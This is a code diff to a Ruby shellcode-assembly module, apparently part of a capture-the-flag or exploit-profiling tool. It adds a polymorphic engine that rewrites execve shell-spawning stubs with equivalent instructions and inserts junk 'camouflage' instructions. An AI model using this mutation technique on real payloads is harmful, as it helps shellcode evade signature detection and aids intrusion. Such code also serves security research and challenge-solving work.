@@ -178,6 +178,40 @@ module AugureProfiler
       }
     }.freeze
 
+    # The equivalence pools (the ghost-writing engine): each named slot
+    # has semantically equal replacements; the rng picks per slot and
+    # inserts camouflage between the independent blocks. Deterministic
+    # per seed - the audit reproduces the exact payload.
+    EQUIVALENCES = {
+      "zero_edx" => {"x64" => ["xor edx, edx", "push 0\npop rdx"],
+                     "x86" => ["xor edx, edx", "push 0\npop edx"]},
+      "zero_esi" => {"x64" => ["xor esi, esi", "push 0\npop rsi"]},
+      "load_callnum" => {"x64" => ["push 59\npop rax", "mov eax, 59"],
+                         "x86" => ["push 11\npop eax", "mov eax, 11"]},
+      "junk" => {"x64" => ["xchg ax, ax", "nop", "xchg r8, r8"],
+                 "x86" => ["xchg ax, ax", "nop"]}
+    }.freeze
+
+    def self.polymorph(source, arch, rng)
+      return source unless rng
+
+      key = (arch == :x64) ? "x64" : "x86"
+      # the named slots, when the source uses the standard forms, get
+      # replaced by a pool alternative
+      out = source
+      out = out.sub("xor edx, edx", EQUIVALENCES["zero_edx"][key].sample(random: rng)) if source.include?("xor edx, edx")
+      out = out.sub("xor esi, esi", EQUIVALENCES["zero_esi"][key].sample(random: rng)) if source.include?("xor esi, esi") && key == "x64"
+      out = out.sub("xor ecx, ecx", EQUIVALENCES["zero_esi"][key].sample(random: rng)) if source.include?("xor ecx, ecx") && key == "x86"
+      out = out.sub("push 59\npop rax", EQUIVALENCES["load_callnum"][key].sample(random: rng)) if source.include?("push 59\npop rax")
+      out = out.sub("push 11\npop eax", EQUIVALENCES["load_callnum"][key].sample(random: rng)) if source.include?("push 11\npop eax")
+      # camouflage between the blocks: a junk instruction after the path
+      if out =~ /^(\s*path:\n.*?0\n)/m
+        junk = EQUIVALENCES["junk"][key].sample(random: rng)
+        out = out.sub(/^(\s*shellcode:\n)/) { "#{junk}\n" + Regexp.last_match(1) }
+      end
+      out
+    end
+
     # klass: Metasm::X64 or Metasm::Ia32 (the target architecture).
     # path: the parameter for the path-bearing stubs (sh/bash exec the
     # path; orw reads it - the seccomp answer reads /flag, not a shell).
@@ -189,6 +223,7 @@ module AugureProfiler
       source = source.gsub("PATH_SLOT", path.to_s) if path
       raise ArgumentError, "this stub needs a path" if source.include?("PATH_SLOT")
 
+      source = polymorph(source, arch, rng)
       Metasm::Shellcode.assemble(klass.new, source).encode_string
     end
   end
